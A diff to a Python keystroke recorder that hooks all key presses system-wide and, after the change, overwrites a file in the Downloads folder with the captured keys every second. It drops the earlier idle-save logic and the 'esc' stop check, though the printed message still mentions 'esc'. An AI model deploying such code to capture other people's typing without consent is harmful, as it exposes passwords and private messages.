@@ -30,53 +30,22 @@ def on_key_event(e):
         # Append the key to the recorded sequence
         recorded_sequence.append(key)
 
-# Function to save the recorded sequence to a file
-def save_recorded_sequence_to_file(file_path):
-    try:
-        with open(file_path, 'a') as file:  # Use 'a' for append mode
-            file.write("".join(recorded_sequence))
-        print(f"Recorded sequence saved to '{file_path}'")
-    except Exception as e:
-        print(f"Error: {e}")
-
-# Function to save the recorded data and reset the sequence
-def save_and_clear_sequence(file_path):
-    if len(recorded_sequence) > 0:
-        save_recorded_sequence_to_file(file_path)
-        recorded_sequence.clear()  # Clear the recorded data
-
-# Set the idle time threshold in seconds (adjust as needed)
-idle_time_threshold = 3  # 3 seconds of inactivity
-
-# Initialize the last activity time
-last_activity_time = time.time()
-
 try:
-    print("Recording... Press 'esc' to stop and save.")
+    print("Recording... Press 'esc' to stop.")
 
     # Create a keyboard listener
     keyboard.on_press(on_key_event)
 
     while True:
         # Continuously run and capture keystrokes
-
-        # Check if the 'esc' key has been pressed to exit the loop
-        if keyboard.is_pressed('esc'):
-            break
-
-        # Check for inactivity and save data if the threshold is reached
-        current_time = time.time()
-        if (current_time - last_activity_time) >= idle_time_threshold:
-            save_and_clear_sequence(file_path)
-            last_activity_time = current_time  # Update last activity time
-
+        # Save the recorded sequence to the Downloads folder
+        with open(file_path, 'w') as file:
+            file.write("".join(recorded_sequence))
+        print(f"Recorded sequence saved to '{file_path}'")
         time.sleep(1)  # Sleep for 1 second before checking again
 
 except KeyboardInterrupt:
     pass
 finally:
-    # Ensure the recorded data is saved before exiting
-    save_and_clear_sequence(file_path)
-
     # Unhook all keyboard events
     keyboard.unhook_all()
